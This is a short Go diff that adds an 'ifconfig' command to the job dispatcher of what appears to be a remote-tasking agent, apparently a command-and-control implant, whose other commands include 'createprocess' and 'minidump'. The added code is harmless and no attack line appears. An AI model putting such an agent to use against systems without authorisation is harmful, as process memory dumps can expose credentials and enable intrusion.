@@ -64,6 +64,8 @@ func executeJob() {
 			}
 		case jobs.MODULE:
 			switch strings.ToLower(job.Payload.(jobs.Command).Command) {
+			case "ifconfig":
+				result = commands.Ifconfig(job.Payload.(jobs.Command))
 			case "createprocess":
 				result = commands.CreateProcess(job.Payload.(jobs.Command))
 			case "minidump":
